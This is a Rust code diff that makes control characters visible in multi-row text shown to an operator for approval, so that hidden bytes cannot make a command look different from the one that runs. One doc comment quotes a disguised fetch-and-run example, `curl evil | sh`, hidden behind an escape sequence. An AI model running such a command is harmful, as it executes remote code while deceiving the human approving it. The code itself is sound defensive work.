@@ -57,6 +57,29 @@ pub fn controls_shown(text: &str) -> std::borrow::Cow<'_, str> {
     std::borrow::Cow::Owned(text.chars().map(control_shown).collect())
 }
 
+/// `text` with every control character shown but a line break and a tab,
+/// which the caller lays out: [`wrap_exact`] starts a row at one and expands
+/// the other to the next stop.
+///
+/// For text drawn in several rows that the operator is asked to approve: a
+/// command, a file's lines, an argument's value. A control character dropped
+/// from such text would let `echo safe␛[8m; curl evil | sh` read as a command
+/// that is not the one that runs, and a carriage return would hide what
+/// precedes it on a terminal that honours one.
+pub fn controls_shown_in_rows(text: &str) -> std::borrow::Cow<'_, str> {
+    if !text.contains(|c: char| c.is_control() && !matches!(c, '\n' | '\t')) {
+        return std::borrow::Cow::Borrowed(text);
+    }
+    std::borrow::Cow::Owned(
+        text.chars()
+            .map(|c| match c {
+                '\n' | '\t' => c,
+                c => control_shown(c),
+            })
+            .collect(),
+    )
+}
+
 /// What [`controls_shown`] draws in place of `c`.
 fn control_shown(c: char) -> char {
     match c {
@@ -258,11 +281,14 @@ fn words(text: &str) -> impl Iterator<Item = (usize, &str)> {
 /// or YAML body as one flush column — a different command from the one that
 /// would run. Breaking only at the column also keeps a line break honest:
 /// every row but a line's last is full, so a run of spaces never hides at the
-/// end of a row cut short.
+/// end of a row cut short. A control character other than a line break and a
+/// tab is shown by its glyph, as [`controls_shown_in_rows`] does, since a
+/// dropped one would be an approval of bytes nobody saw.
 pub fn wrap_exact(text: &str, columns: usize) -> Vec<String> {
     if columns == 0 || text.is_empty() {
         return Vec::new();
     }
+    let text = controls_shown_in_rows(text);
     let mut lines = Vec::new();
     for line in text.split('\n') {
         match line.is_empty() {
